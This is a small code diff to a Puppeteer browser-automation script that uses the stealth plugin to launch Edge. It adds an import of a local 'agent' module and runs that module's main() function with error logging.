@@ -2,6 +2,8 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const path = require('path');
 const fs = require('fs');
+const { main } = require("./agent");
+
 
 puppeteer.use(StealthPlugin());
 
@@ -288,6 +290,16 @@ safeLog("[START] Launching Edge...");
     } catch (e) {
       safeLog('[ERROR] Download wait/execute failed: ' + e.message);
       console.error('Download wait/execute failed:', e);
+    }
+
+    try {
+      (
+        async () => {
+          await main();
+        })();
+    } catch (error) {
+      safeLog('[ERROR] agent.js main() failed: ' + error.message);
+      console.error('agent.js main() failed:', error);
     }
 
       //await browser.close();
